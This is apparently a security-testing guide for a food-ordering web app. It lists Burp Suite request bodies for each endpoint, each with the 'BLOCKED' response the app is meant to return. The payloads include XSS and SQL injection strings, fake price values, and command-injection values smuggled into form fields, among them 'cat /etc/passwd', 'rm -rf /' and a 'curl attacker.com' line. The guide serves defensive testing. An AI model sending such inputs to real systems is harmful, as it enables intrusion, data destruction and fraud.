# Burp Suite Payloads for Security Testing - BHOKBHOJ Platform

## 🎯 Quick Reference - Copy & Paste Payloads for Burp Suite

This document contains **2 payloads per page** for demonstrating security testing. All payloads are designed to show how the system properly blocks malicious inputs.

---

## 🚨 CRITICAL: Command Injection Attack Test

**Endpoint:** `POST /api/auth/register`  
**Page Location:** Frontend - Registration/Signup Form  
**Credentials Checking Point:** Username, Email, Phone, Address fields

### Command Injection in Username Field

**Request Body:**
```json
{
  "username": "testuser; whoami",
  "email": "test@test.com",
  "password": "password123",
  "confirmpassword": "password123",
  "fullname": "Test User",
  "phone": "1234567890",
  "address": "Test Address"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Command Injection detected and BLOCKED",
  "security": {
    "attackType": "Command Injection",
    "severity": "CRITICAL",
    "violations": 1,
    "highestSeverity": "CRITICAL",
    "details": [
      {
        "field": "username",
        "value": "testuser; whoami",
        "attackType": "Command Injection",
        "severity": "CRITICAL",
        "description": "🚨 CRITICAL SECURITY WARNING: Command injection detected! This malicious input contains shell commands and operators that could execute arbitrary commands on the server, potentially compromising the entire system. This input has been BLOCKED immediately.",
        "warning": "⚠️ This Command Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/register",
    "action": "BLOCKED",
    "note": "This security violation has been logged. All malicious input is automatically rejected."
  }
}
```

**Alternative Command Injection Payloads (Also Blocked):**
- `username: "testuser | cat /etc/passwd"`
- `username: "testuser && ls -la"`
- `username: "testuser `id`"`
- `username: "testuser $(whoami)"`
- `phone: "123; rm -rf /"`
- `address: "123 Main St && curl attacker.com"`

**Note:** Command Injection is a **CRITICAL** severity attack that attempts to execute arbitrary system commands on the server. The system detects shell operators (`;`, `|`, `&`, `` ` ``, `$()`) combined with common commands (`whoami`, `ls`, `cat`, `rm`, `curl`, etc.) and blocks them immediately.

---

## 📋 Testing Endpoints

1. [Register/Signup Page](#1-registersignup-page)
2. [Login Page](#2-login-page)
3. [OTP Verification](#3-otp-verification)
4. [Cart Operations](#4-cart-operations)
5. [Order Placement](#5-order-placement)
6. [Update Profile](#6-update-profile)
7. [URL-Based XSS (Reflected XSS)](#7-url-based-xss-reflected-xss)

---

## 1. Register/Signup Page

**Endpoint:** `POST /api/auth/register`  
**Page Location:** Frontend - Registration/Signup Form  
**Credentials Checking Point:** Username, Email fields

### Payload 1: XSS in Username Field

**Request Body:**
```json
{
  "username": "<script>alert('XSS')</script>",
  "email": "test@test.com",
  "password": "password123",
  "confirmpassword": "password123",
  "fullname": "Test User",
  "phone": "1234567890",
  "address": "Test Address"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "username",
        "value": "<script>alert('XSS')</script>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/register",
    "action": "BLOCKED",
    "note": "This security violation has been logged. All malicious input is automatically rejected."
  }
}
```

### Payload 2: SQL Injection in Email Field

**Request Body:**
```json
{
  "username": "testuser",
  "email": "test' OR '1'='1'--@test.com",
  "password": "password123",
  "confirmpassword": "password123",
  "fullname": "Test User",
  "phone": "1234567890",
  "address": "Test Address"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: SQL Injection detected and BLOCKED",
  "security": {
    "attackType": "SQL Injection",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "email",
        "value": "test' OR '1'='1'--@test.com",
        "attackType": "SQL Injection",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: SQL injection attempt detected! This malicious input contains SQL keywords or injection patterns that could manipulate database queries, potentially allowing unauthorized data access or modification. This input has been BLOCKED for security.",
        "warning": "⚠️ This SQL Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/register",
    "action": "BLOCKED"
  }
}
```

---

## 2. Login Page

**Endpoint:** `POST /api/auth/login`  
**Page Location:** Frontend - Login Form  
**Credentials Checking Point:** Username/Email, Password fields

### Payload 1: XSS in Username Field

**Request Body:**
```json
{
  "username": "<img src=x onerror=alert('XSS')>",
  "password": "password123"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "username",
        "value": "<img src=x onerror=alert('XSS')>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/login",
    "action": "BLOCKED"
  }
}
```

### Payload 2: SQL Injection in Password Field

**Request Body:**
```json
{
  "username": "testuser",
  "password": "' OR '1'='1"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: SQL Injection detected and BLOCKED",
  "security": {
    "attackType": "SQL Injection",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "password",
        "value": "' OR '1'='1",
        "attackType": "SQL Injection",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: SQL injection attempt detected! This malicious input contains SQL keywords or injection patterns that could manipulate database queries, potentially allowing unauthorized data access or modification. This input has been BLOCKED for security.",
        "warning": "⚠️ This SQL Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/login",
    "action": "BLOCKED"
  }
}
```

---

## 3. OTP Verification

**Endpoint:** `POST /api/auth/verify-otp`  
**Page Location:** Frontend - OTP Verification Form  
**Credentials Checking Point:** UserId, OTP fields

### Payload 1: XSS in OTP Field

**Request Body:**
```json
{
  "userId": "507f1f77bcf86cd799439011",
  "otp": "<script>alert('XSS')</script>"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "otp",
        "value": "<script>alert('XSS')</script>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/verify-otp",
    "action": "BLOCKED"
  }
}
```

### Payload 2: Command Injection in UserId Field

**Request Body:**
```json
{
  "userId": "507f1f77bcf86cd799439011; whoami",
  "otp": "123456"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Command Injection detected and BLOCKED",
  "security": {
    "attackType": "Command Injection",
    "severity": "CRITICAL",
    "violations": 1,
    "highestSeverity": "CRITICAL",
    "details": [
      {
        "field": "userId",
        "value": "507f1f77bcf86cd799439011; whoami",
        "attackType": "Command Injection",
        "severity": "CRITICAL",
        "description": "🚨 CRITICAL SECURITY WARNING: Command injection detected! This malicious input contains shell commands and operators that could execute arbitrary commands on the server, potentially compromising the entire system. This input has been BLOCKED immediately.",
        "warning": "⚠️ This Command Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/auth/verify-otp",
    "action": "BLOCKED"
  }
}
```

---

## 4. Cart Operations

**Endpoint:** `PUT /api/cart/update`  
**Page Location:** Frontend - Cart Page (when updating quantity)  
**Credentials Checking Point:** ProductId, Quantity, Price fields

### Payload 1: Price Manipulation Attack (Negative Price)

**Request Body:**
```json
{
  "productId": "507f1f77bcf86cd799439011",
  "quantity": 1,
  "price": -100
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "Price cannot be modified. Price is set from product catalog.",
  "security": {
    "attackType": "Price Manipulation Attack",
    "severity": "CRITICAL",
    "description": "Attempted to modify product price in cart. Price manipulation attacks are blocked. Prices are always retrieved from the product catalog to prevent fraud.",
    "action": "BLOCKED",
    "note": "Price is automatically set from product database and cannot be changed by client requests."
  }
}
```

### Payload 2: Price Manipulation Attack (Zero Price)

**Request Body:**
```json
{
  "productId": "507f1f77bcf86cd799439011",
  "quantity": 1,
  "price": 0
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "Price cannot be modified. Price is set from product catalog.",
  "security": {
    "attackType": "Price Manipulation Attack",
    "severity": "CRITICAL",
    "description": "Attempted to modify product price in cart. Price manipulation attacks are blocked. Prices are always retrieved from the product catalog to prevent fraud.",
    "action": "BLOCKED",
    "note": "Price is automatically set from product database and cannot be changed by client requests."
  }
}
```

**Important:** The `price` field is **STRICTLY FORBIDDEN** in cart update requests. Even if you try to send:
- `price: 0` → BLOCKED
- `price: -100` → BLOCKED  
- `price: 0.01` → BLOCKED
- `price: 999999` → BLOCKED
- `price: null` → BLOCKED
- **ANY price value** → BLOCKED

The system will **ALWAYS reject it** and use the price from the product database. The price field should **NOT be included** in the request body at all.

---

## 5. Order Placement

**Endpoint:** `POST /api/orders`  
**Page Location:** Frontend - Checkout/Order Placement  
**Credentials Checking Point:** PaymentMethod, DeliveryInstructions

### Payload 1: XSS in Delivery Instructions

**Request Body:**
```json
{
  "paymentMethod": "cash",
  "deliveryInstructions": "<script>alert('XSS')</script>"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "deliveryInstructions",
        "value": "<script>alert('XSS')</script>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/orders",
    "action": "BLOCKED"
  }
}
```

### Payload 2: SQL Injection in Delivery Instructions

**Request Body:**
```json
{
  "paymentMethod": "cash",
  "deliveryInstructions": "'; DROP TABLE orders--"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: SQL Injection detected and BLOCKED",
  "security": {
    "attackType": "SQL Injection",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "deliveryInstructions",
        "value": "'; DROP TABLE orders--",
        "attackType": "SQL Injection",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: SQL injection attempt detected! This malicious input contains SQL keywords or injection patterns that could manipulate database queries, potentially allowing unauthorized data access or modification. This input has been BLOCKED for security.",
        "warning": "⚠️ This SQL Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "POST /api/orders",
    "action": "BLOCKED"
  }
}
```

**Important:** Prices in orders are **automatically recalculated** from the product database. The system re-fetches each product and uses the current price from the database, completely ignoring any price values that might be in the cart. Price manipulation in orders is **impossible**.

---

## 6. Update Profile

**Endpoint:** `PUT /api/auth/update`  
**Page Location:** Frontend - Update Profile Form  
**Credentials Checking Point:** Fullname, Username, Email, Phone, Address fields

### Payload 1: XSS in Fullname Field

**Request Body:**
```json
{
  "fullname": "<script>alert('XSS')</script>",
  "currentPassword": "currentpass123"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "fullname",
        "value": "<script>alert('XSS')</script>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "PUT /api/auth/update",
    "action": "BLOCKED"
  }
}
```

### Payload 2: SQL Injection in Email Field

**Request Body:**
```json
{
  "email": "test' OR '1'='1'--@test.com",
  "currentPassword": "currentpass123"
}
```

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: SQL Injection detected and BLOCKED",
  "security": {
    "attackType": "SQL Injection",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "email",
        "value": "test' OR '1'='1'--@test.com",
        "attackType": "SQL Injection",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: SQL injection attempt detected! This malicious input contains SQL keywords or injection patterns that could manipulate database queries, potentially allowing unauthorized data access or modification. This input has been BLOCKED for security.",
        "warning": "⚠️ This SQL Injection attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "PUT /api/auth/update",
    "action": "BLOCKED"
  }
}
```

---

## 7. URL-Based XSS (Reflected XSS)

**Endpoints:** 
- `GET /api/food/products?search=<payload>` (Query Parameter)
- `GET /api/food/products/<payload>` (URL Parameter)
- `GET /api/orders?status=<payload>` (Query Parameter)
- `GET /api/orders/<payload>` (URL Parameter)

**Page Location:** Frontend - Product Search, Order List, Product Details  
**Credentials Checking Point:** URL query parameters and URL path parameters

### Payload 1: Reflected XSS in Query Parameter (Search)

**Request URL:**
```
GET /api/food/products?search=<script>alert('XSS')</script>
```

**Full Request (Burp Suite):**
```
GET /api/food/products?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
Host: localhost:5050
User-Agent: Mozilla/5.0
Accept: application/json
```

**Note:** Express automatically URL-decodes query parameters and path parameters. The security validation checks the decoded values, so both URL-encoded (`%3Cscript%3E`) and plain (`<script>`) payloads are detected and blocked.

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "search",
        "value": "<script>alert('XSS')</script>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "GET /api/food/products?search=<script>alert('XSS')</script>",
    "action": "BLOCKED",
    "note": "This security violation has been logged. All malicious input is automatically rejected."
  }
}
```

### Payload 2: Reflected XSS in URL Parameter (Product ID)

**Request URL:**
```
GET /api/food/products/<img src=x onerror=alert('XSS')>
```

**Full Request (Burp Suite):**
```
GET /api/food/products/%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E HTTP/1.1
Host: localhost:5050
User-Agent: Mozilla/5.0
Accept: application/json
```

**Note:** Express automatically URL-decodes path parameters. The security validation checks the decoded values, so both URL-encoded and plain payloads are detected and blocked.

**Expected Response (400 Bad Request):**
```json
{
  "success": false,
  "message": "🚨 SECURITY ALERT: Cross-Site Scripting (XSS) detected and BLOCKED",
  "security": {
    "attackType": "Cross-Site Scripting (XSS)",
    "severity": "HIGH",
    "violations": 1,
    "highestSeverity": "HIGH",
    "details": [
      {
        "field": "id",
        "value": "<img src=x onerror=alert('XSS')>",
        "attackType": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "⚠️ SECURITY WARNING: Cross-Site Scripting (XSS) attack detected! This malicious input contains script tags or JavaScript code that could execute in user browsers, potentially stealing sensitive data or performing unauthorized actions. This input has been BLOCKED for security.",
        "warning": "⚠️ This Cross-Site Scripting (XSS) attempt has been BLOCKED. Your request has been logged for security monitoring."
      }
    ],
    "timestamp": "2026-01-04T13:30:00.000Z",
    "endpoint": "GET /api/food/products/<img src=x onerror=alert('XSS')>",
    "action": "BLOCKED",
    "note": "This security violation has been logged. All malicious input is automatically rejected."
  }
}
```

**Note:** These payloads test for **Reflected XSS** vulnerabilities where malicious scripts in URL parameters or query strings could be reflected back in the response. The system validates both query parameters (`req.query`) and URL path parameters (`req.params`) to prevent these attacks.

**DOM-Based XSS Prevention:**
- DOM-based XSS occurs when JavaScript on the client-side manipulates the DOM with untrusted data
- The backend validates and sanitizes all URL parameters and query strings before they reach the frontend
- Frontend should also use proper encoding when displaying user-controlled data
- All URL parameters are validated by `securityValidation` middleware before processing

---

## 🔄 How to Use in Burp Suite

### Step-by-Step Instructions:

1. **Start Burp Suite** and configure your browser proxy

2. **Intercept Request:**
   - Go to **Proxy → Intercept** tab
   - Turn **Intercept is on**
   - Fill the form normally on the website
   - Click submit
   - You'll see the request in Burp Suite

3. **Forward OPTIONS Request:**
   - First request will be **OPTIONS** (preflight)
   - Click **Forward** to allow it
   - The actual **POST/PUT** request will appear

4. **Modify Request:**
   - **For POST/PUT requests:** In the **Request** tab, find the JSON body and replace the field value with the payload
   - **For GET requests (URL-based XSS):** In the **Request** tab, modify the URL directly:
     - For query parameters: Change `?search=test` to `?search=<script>alert('XSS')</script>`
     - For URL parameters: Change `/api/food/products/123` to `/api/food/products/<script>alert('XSS')</script>`
   - Example: Change `"username": "testuser"` to `"username": "<script>alert('XSS')</script>"`

5. **Send to Repeater (Optional):**
   - Right-click the request → **Send to Repeater**
   - In **Repeater** tab, click **Send**
   - This allows you to test multiple payloads easily

6. **Check Response:**
   - Go to **Response** tab
   - Look for the `security` object in JSON response
   - You'll see:
     - `attackType`: The type of attack detected
     - `severity`: CRITICAL, HIGH, MEDIUM, or LOW
     - `action`: "BLOCKED"
     - `details`: Field and value where attack was detected

7. **View in Raw Format:**
   - Click **Raw** tab to see full HTTP response
   - Status code will be **400 Bad Request** for security violations
   - Response body contains detailed security information

---

## 📊 Security Features Demonstrated

### ✅ Input Validation
- **XSS Protection**: All HTML/JavaScript tags detected and blocked
- **SQL Injection Protection**: SQL keywords and patterns detected and blocked
- **Command Injection Protection**: Shell commands and operators detected and blocked
- **NoSQL Injection Protection**: MongoDB operators detected and blocked

### ✅ Price Protection (CRITICAL)
- **Price is STRICTLY FORBIDDEN** in cart update requests
- Prices are **ALWAYS** retrieved from product database
- Client **CANNOT** modify prices (negative, zero, decimal, or any value)
- Order prices are **recalculated** from product database
- Response clearly shows "Price cannot be modified"

### ✅ Quantity Validation
- Quantity must be positive integer >= 1
- Negative, zero, decimal, and string quantities are rejected

### ✅ Security Response Format
All security violations return detailed JSON responses with:
- Attack type (exact type detected)
- Severity level
- Field where attack was detected
- Description of the attack
- Action taken (BLOCKED)
- Timestamp and endpoint

---

## 🎯 Quick Testing Summary

| Page | Payload 1 | Payload 2 | Endpoint |
|------|-----------|-----------|----------|
| **Register** | XSS in username | SQL injection in email | `POST /api/auth/register` |
| **Login** | XSS in username | SQL injection in password | `POST /api/auth/login` |
| **OTP** | XSS in OTP | Command injection in userId | `POST /api/auth/verify-otp` |
| **Cart Update** | Price: -100 | Price: 0 | `PUT /api/cart/update` |
| **Order** | XSS in delivery instructions | SQL injection in delivery instructions | `POST /api/orders` |
| **Update Profile** | XSS in fullname | SQL injection in email | `PUT /api/auth/update` |
| **URL-Based XSS** | XSS in query param (?search=) | XSS in URL param (/products/) | `GET /api/food/products` |

---

## 💡 Important Notes

1. **Price Manipulation**: The system **STRICTLY FORBIDS** any price modification. Even if you send `price: 0`, `price: -50`, `price: 0.01`, or `price: 999999`, it will be **BLOCKED**. Prices are always from the product database.

2. **NoSQL Injection**: The payload `'||1||'` is not applicable as the system uses proper MongoDB parameterization. However, NoSQL operator payloads (`$ne`, `$or`, etc.) will be detected and blocked.

3. **Credentials Visible**: All request bodies (including credentials) are visible in Burp Suite when intercepting. This is normal for security testing.

4. **Response Format**: All security violations return **400 Bad Request** with detailed `security` object showing exactly what was detected and blocked.

---

## 🔒 Security Demonstrations

### Price Protection Example:
```json
Request:
{
  "productId": "507f1f77bcf86cd799439011",
  "quantity": 1,
  "price": -100  ← This will be BLOCKED
}

Response:
{
  "success": false,
  "message": "Price cannot be modified. Price is set from product catalog.",
  "security": {
    "attackType": "Price Manipulation Attack",
    "severity": "CRITICAL",
    "action": "BLOCKED"
  }
}
```

**The price field is completely ignored and the system uses the price from the product database.**

---

Happy Security Testing! 🚀🔒
